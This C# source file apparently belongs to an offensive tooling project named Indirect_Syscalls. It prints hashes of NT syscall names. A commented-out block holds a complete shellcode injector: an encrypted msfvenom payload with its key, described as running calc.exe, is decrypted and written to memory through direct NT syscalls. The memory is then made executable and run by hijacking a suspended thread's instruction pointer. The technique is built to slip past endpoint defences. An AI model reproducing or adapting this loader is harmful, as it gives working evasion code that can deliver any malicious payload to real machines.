using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using static Indirect_Syscalls.Native;
using static Indirect_Syscalls.Syscalls;
using static Indirect_Syscalls.Crypto;

namespace Indirect_Syscalls
{
    internal class Program
    {
        static void Main(string[] args)
        {

            Console.WriteLine(HashSyscall("NtCreateThreadEx"));
            Console.WriteLine(HashSyscall("NtGetContextThread"));
            Console.WriteLine(HashSyscall("NtOpenProcess"));
            Console.WriteLine(HashSyscall("NtOpenThread"));
            Console.WriteLine(HashSyscall("NtProtectVirtualMemory"));
            Console.WriteLine(HashSyscall("NtResumeThread"));
            Console.WriteLine(HashSyscall("NtSetContextThread"));
            Console.WriteLine(HashSyscall("NtSuspendThread"));
            Console.WriteLine(HashSyscall("NtWriteVirtualMemory"));

            // Space for payload - msfvenom -p windows/x64/exec CMD=calc.exe
            /*string key = "YYrz0BQDTeHxikNNzll79dCRSJ8blaD4";
            string payload = "3as8lOodQt6x6xtLSrr09r/Dbf3CQbYsfSdMmG7VFWIx6oJnx/w96XDQYWqHFJ8LVY1Hg6hAAULz52ylD7j17CyU6GiMx6zY61MmZqf2F4jnyaJObx6mR8Uhqil8Ff1nXkdQiQR15uChHAH3IVm4ueRZE97G2Af5v+o/XHm9OuQe5o/uCenHwcz4rVfprKwfZxPnb6eUUxhlI9k3UxBpqxYQD9jXU1tc9ejZZ6/8gnrTTkmteVaVpR2ua/WXuisXfBuGKFJlWQtZooHqsJfSGbfiKweJLj0v568nSiZbmTj5+OonXQH9/HL/GMbc/bJkVB1w6QHKbl0lGz3EI44pA+V+rdpphz2eYRsQP3an6THn1GAgUZG7HlYAY+MbhQl3OxMTTmmtLjTl+zhvqzNR+g==";

            byte[] buf = Decrypt(key, payload);

            Console.WriteLine(DateTime.Now);
            
            // Get base address for Ntdll
            Console.WriteLine("Test execution direct syscalls at {0}", DateTime.Now);
            Console.WriteLine("NtDll base address is 0x{0}", Syscalls.NtDllBaseAddress.ToString("X"));

            // Get Thread from current process
            var pid = Process.GetCurrentProcess();

            // Syscall for NtOpenProcess
            CLIENT_ID cID = new CLIENT_ID();
            cID.UniqueProcess = (IntPtr)(UInt32)pid.Id;
            OBJECT_ATTRIBUTES oAttr = new OBJECT_ATTRIBUTES();
            IntPtr hProc = IntPtr.Zero;

            // Open the process with NtOpenProcess
            Console.WriteLine("[+] Call NtOpenProcess in PID {0}", pid);
            NTSTATUS status = NtOpenProcess(ref hProc, 0x001F0FF, ref oAttr, ref cID);
            Console.WriteLine("[+] Status of call{0}, Address of the process=0x{1}", status.ToString(), hProc.ToString("X"));

            // set up the syscall for NtAllocateVirtualMemory
            IntPtr baseAddress = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)(buf.Length);

            // make the NtAllocateVirtualMemory syscall
            Console.WriteLine("[+] Syscall NtAllocateVirtualMemory on 0x{0}", new string[] { hProc.ToString("X") });
            status = NtAllocateVirtualMemory(hProc, ref baseAddress, IntPtr.Zero, ref regionSize, 0x3000, 0x04);
            Console.WriteLine("[+] Return, NTSTATUS={0}, baseAddress=0x{1}", new string[] { status.ToString(), baseAddress.ToString("X") });

            // set up the syscall for NtWriteVirtualMemory
            var buffer = Marshal.AllocHGlobal(buf.Length);
            Marshal.Copy(buf, 0, buffer, buf.Length);
            uint bytesWritten = 0;

            // make the NtWriteVirtualMemory syscall
            Console.WriteLine("[+] Syscall NtWriteVirtualMemory to 0x{0}", new string[] { baseAddress.ToString("X") });
            status = NtWriteVirtualMemory(hProc, baseAddress, buffer, (uint)buf.Length, ref bytesWritten);
            Console.WriteLine("[+] Return, NTSTATUS={0}, bytesWritten=0x{1}", new string[] { status.ToString(), bytesWritten.ToString() });

            // set up the syscall for NtProtectVirtualMemory
            uint oldProtect = 0;

            // make the NtProtectVirtualMemory syscall
            Console.WriteLine("[+] Syscall NtProtectVirtualMemory on 0x{0}", new string[] { baseAddress.ToString("X") });
            status = NtProtectVirtualMemory(hProc, ref baseAddress, ref regionSize, (uint)AllocationProtect.PAGE_EXECUTE_READ, ref oldProtect);
            Console.WriteLine("[+] Return, NTSTATUS={0}", new string[] { status.ToString() });

            IntPtr hThread = IntPtr.Zero;
            Console.WriteLine("[+] Getting Thread in PID {0}", pid);
            
            //Console.WriteLine("[+] CreateThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
            status = NtCreateThreadEx(ref hThread, ThreadAccess.ALL_ACCESS, IntPtr.Zero, hProc, baseAddress, IntPtr.Zero, (uint)ThreadCreationFlags.CREATE_SUSPENDED, 0, 0, 0, IntPtr.Zero);
            Console.WriteLine("[+] Thread created returned {0}, ThreadID={1}", status, hThread.ToString("X"));

            // Create Context for Thread
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = CONTEXT_FLAGS.CONTEXT_ALL;
            

            // get the thread context - we are looking to manipulate the instruction pointer register
            Console.WriteLine("[+] GetThreadContext() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
            status = NtGetContextThread(hThread, ref ctx);
            Console.WriteLine("[+] Return, NTSTATUS={0}", new string[] { status.ToString() });

            Console.WriteLine("[+] RIP is: 0x{0}", new string[] { ctx.Rip.ToString("X") });

            ctx.Rip = (ulong)baseAddress;

            // set the thread context (update the registers)
            Console.WriteLine("[+] SetThreadContext(), RIP assigned: 0x{0}", new string[] { ctx.Rip.ToString("X") });
            status = NtSetContextThread(hThread, ref ctx);
            Console.WriteLine("[+] Return, NTSTATUS={0}", new string[] { status.ToString() });
            
            // Resume thread
            Console.WriteLine("[+] ResumeThread() - thread handle: 0x{0}", new string[] { hThread.ToString("X") });
            NtResumeThread(hThread, ref oldProtect);
                        
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            
            Console.WriteLine(DateTime.Now); 
            Console.ReadLine();*/
        }

       
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
    }
}
